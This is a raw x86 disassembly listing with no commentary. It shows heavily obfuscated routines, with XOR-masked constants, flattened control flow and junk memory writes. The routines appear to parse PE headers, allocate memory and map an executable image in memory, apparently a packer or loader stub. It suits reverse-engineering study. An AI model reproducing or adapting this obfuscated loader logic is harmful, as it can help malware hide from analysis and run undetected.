  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
